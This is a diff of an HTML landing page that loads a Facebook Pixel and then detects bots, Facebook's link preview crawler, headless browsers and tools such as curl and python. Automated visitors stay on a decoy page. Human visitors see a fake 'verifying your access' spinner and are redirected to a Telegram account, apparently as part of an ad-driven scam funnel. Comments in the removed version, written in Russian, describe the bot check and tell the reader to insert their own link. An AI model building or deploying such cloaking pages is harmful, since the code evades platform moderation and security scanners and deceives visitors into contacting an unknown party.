@@ -3,70 +3,80 @@
 <head>
   <meta charset="UTF-8" />
   <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
-  <title>Noticias de Argentina</title>
+  <title>¡Acceso exclusivo!</title>
 
   <!-- Facebook Pixel -->
   <script>
-    !function(f,b,e,v,n,t,s)
-    {if(f.fbq)return;n=f.fbq=function(){n.callMethod?
-    n.callMethod.apply(n,arguments):n.queue.push(arguments)};
-    if(!f._fbq)f._fbq=n;n.push=n;n.loaded=!0;n.version='2.0';
-    n.queue=[];t=b.createElement(e);t.async=!0;
-    t.src=v;s=b.getElementsByTagName(e)[0];
-    s.parentNode.insertBefore(t,s)}(window, document,'script',
-    'https://connect.facebook.net/en_US/fbevents.js');
+    !function(f,b,e,v,n,t,s){
+      if(f.fbq)return;n=f.fbq=function(){n.callMethod?
+      n.callMethod.apply(n,arguments):n.queue.push(arguments)};
+      if(!f._fbq)f._fbq=n;n.push=n;n.loaded=!0;n.version='2.0';
+      n.queue=[];t=b.createElement(e);t.async=!0;
+      t.src=v;s=b.getElementsByTagName(e)[0];
+      s.parentNode.insertBefore(t,s)}(window, document,'script',
+      'https://connect.facebook.net/en_US/fbevents.js');
     fbq('init', '703244512292417');
     fbq('track', 'PageView');
   </script>
 
   <style>
     body {
-      font-family: Arial, sans-serif;
-      background: #f9f9f9;
       margin: 0;
       padding: 0;
+      background: linear-gradient(135deg, #00aaff, #00ffaa);
+      color: white;
+      font-family: 'Segoe UI', sans-serif;
+      text-align: center;
       display: flex;
+      flex-direction: column;
       justify-content: center;
       align-items: center;
       height: 100vh;
-      color: #333;
-    }
-    .container {
-      text-align: center;
-    }
-    .flag {
-      width: 50px;
-      margin-bottom: 10px;
+      overflow: hidden;
     }
     h1 {
-      font-size: 2em;
-      color: #0056b3;
+      font-size: 3em;
+      margin-bottom: 0.2em;
+    }
+    p {
+      font-size: 1.2em;
+      max-width: 80%;
+    }
+    .loader {
+      margin-top: 20px;
+      border: 4px solid white;
+      border-top: 4px solid transparent;
+      border-radius: 50%;
+      width: 40px;
+      height: 40px;
+      animation: spin 1s linear infinite;
+    }
+    @keyframes spin {
+      0% {transform: rotate(0deg);}
+      100% {transform: rotate(360deg);}
     }
   </style>
 </head>
 <body>
-  <div class="container">
-    <img class="flag" src="https://upload.wikimedia.org/wikipedia/commons/1/1a/Flag_of_Argentina.svg" alt="Argentina">
-    <h1>Noticias de Argentina</h1>
-    <p>Redireccionando...</p>
-  </div>
+  <h1>¡Gracias por confiar en nosotros!</h1>
+  <p>Estamos verificando tu acceso... serás redirigido automáticamente.</p>
+  <div class="loader"></div>
 
   <script>
-    async function detect() {
+    async function start() {
       const ua = navigator.userAgent || '';
-      const isBot = /bot|crawl|spider|facebook|preview/i.test(ua) || navigator.webdriver;
+      const isBot = /bot|crawl|spider|facebook|preview|wget|curl|python/i.test(ua) || navigator.webdriver;
 
-      // Если бот — останется на этой странице
-      if (isBot) return;
-
-      // Если не бот — редирект на Telegram
-      setTimeout(() => {
-        window.location.href = "https://t.me/Veronica_especialista"; // ← укажи свою ссылку
-      }, 3000);
+      if (!isBot) {
+        setTimeout(() => {
+          window.location.href = "https://t.me/Veronica_especialista";
+        }, 4000);
+      }
     }
 
-    detect();
+    start();
   </script>
 </body>
 </html>
+
 
